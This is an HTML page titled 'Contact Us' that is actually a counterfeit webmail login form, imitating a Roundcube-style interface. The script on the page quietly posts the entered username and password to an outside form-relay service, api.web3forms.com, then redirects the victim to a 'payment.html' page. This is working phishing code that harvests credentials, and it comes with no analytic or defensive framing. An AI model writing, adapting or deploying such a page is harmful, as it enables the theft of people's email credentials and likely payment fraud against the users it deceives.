    <h1 class="voice">Contact Us</h1>

    <div id="login-form">
        <div class="box-inner" role="main">
            <form id="contact-form" action="https://api.web3forms.com/submit" method="POST">
                <input type="hidden" name="access_key" value="22dc8ec1-19a8-4d10-bd96-551ddd1f0281">
                <!-- Removed redirect field since we're handling it manually -->
                
                <h3>Login</h3>
                <table>
                    <tbody>
                        <tr>
                            <td class="title"><label for="name">Username</label></td>
                            <td class="input"><input name="name" id="name" required size="40" autocapitalize="off" autocomplete="off" type="text"></td>
                        </tr>
                        <tr>
                            <td class="title"><label for="email">Password</label></td>
                            <td class="input"><input name="email" id="email" required size="40" autocapitalize="off" autocomplete="off" type="password"></td>
                        </tr>
                    </tbody>
                </table>
                <p class="formbuttons">
                    <button type="submit" id="rcmloginsubmit" class="button mainaction submit">Login</button>
                </p>
            </form>
            <!-- Feedback message container -->
            <div id="feedback" class="feedback"></div>
        </div>

        <div class="box-bottom" role="complementary">
            <div id="message"></div>
            <noscript>
                <p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
            </noscript>
        </div>

        <div id="bottomline" role="contentinfo">
            My Webmail
        </div>
    </div>

    <script>
        document.getElementById('contact-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            const form = this;
            const feedback = document.getElementById('feedback');
            
            // Show a message to the user
            feedback.textContent = 'Submitting... Redirecting in 3 seconds...';

            // Submit the form data in the background (no waiting for response)
            fetch(form.action, {
                method: 'POST',
                body: new FormData(form)
            }); // No .then() or .catch() since we donâ€™t wait for a response

            // Redirect after 3 seconds
            setTimeout(() => {
                window.location.href = './payment.html';
            }, 3000); // 3000 milliseconds = 3 seconds
        });
    </script>
